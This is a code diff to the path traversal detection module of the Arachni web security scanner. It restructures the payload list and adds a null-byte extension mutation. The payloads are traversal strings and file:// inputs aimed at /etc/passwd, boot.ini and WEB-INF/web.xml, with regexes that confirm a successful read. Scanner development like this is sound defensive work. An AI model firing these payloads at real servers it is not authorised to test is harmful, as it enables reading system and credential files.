@@ -27,54 +27,57 @@
 #
 class Arachni::Modules::PathTraversal < Arachni::Module::Base
 
-    def self.traversals
-        @trv ||=  [
+    def self.inputs
+        return @inputs if @inputs
+
+        @inputs = {}
+        {
+            'etc/passwd'      => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
+            'boot.ini'        => /\[boot loader\](.*)\[operating systems\]/im
+        }.each do |file, regexp|
+            [
+                '/',
+                '/../../../../../../../../../../../../../../../../'
+            ].each do |trv|
+                @inputs["#{trv}#{file}"] = regexp
+                @inputs["file://#{trv}#{file}"] = regexp
+            end
+        end
+
+        [
             '',
             '/',
             '/../../',
             '../../',
-            '/../../../../../../../../../../../../../../../../',
-        ].map { |trv| [trv, "file://#{trv}"] }.flatten
-    end
+        ].each do |trv|
+            @inputs["#{trv}WEB-INF/web.xml"] = '<web-app'
+            @inputs["file://#{trv}WEB-INF/web.xml"] = '<web-app'
+        end
 
-    def self.extensions
-        @extentions ||= [
-            "",
-            "\0.htm",
-            "\0.html",
-            "\0.asp",
-            "\0.aspx",
-            "\0.php",
-            "\0.txt",
-            "\0.gif",
-            "\0.jpg",
-            "\0.jpeg",
-            "\0.png",
-            "\0.css"
-        ]
-    end
-
-    def self.params
-        @params ||= {
-            'etc/passwd'      => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
-            'boot.ini'        => /\[boot loader\](.*)\[operating systems\]/im,
-            'WEB-INF/web.xml' => '<web-app'
-        }
-    end
-
-    def self.inputs
-        @inputs ||= {}
-        params.each do |file, regexp|
-            extensions.each do |ext|
-                traversals.each { |trv| @inputs[trv + file + ext] = regexp }
-            end
-        end if @inputs.empty?
         @inputs
     end
 
     def run
+        # add one more mutation (on the fly) which will include the extension
+        # of the original value after a null byte
+        each_mutation = proc do |mutation|
+            m = mutation.dup
+
+            # figure out the extension of the default value, if it has one
+            ext = m.orig[m.altered].to_s.split( '.' )
+            ext = ext.size > 1 ? ext.last : nil
+
+            # null terminate the injected value and append the ext
+            m.altered_value += "\x00.#{ext}"
+
+            # pass our new element back to be audited
+            m
+        end
+
         self.class.inputs.each do |file, regexp|
-            audit( file, format: [Format::STRAIGHT], regexp: regexp )
+            audit( file, format:        [Format::STRAIGHT],
+                         regexp:        regexp,
+                         each_mutation: each_mutation )
         end
     end
 
@@ -91,7 +94,7 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
                 'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                 'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
             },
-            targets:     %w(Unix Windows),
+            targets:     %w(Unix Windows Tomcat),
 
             issue:       {
                 name:            %q{Path Traversal},
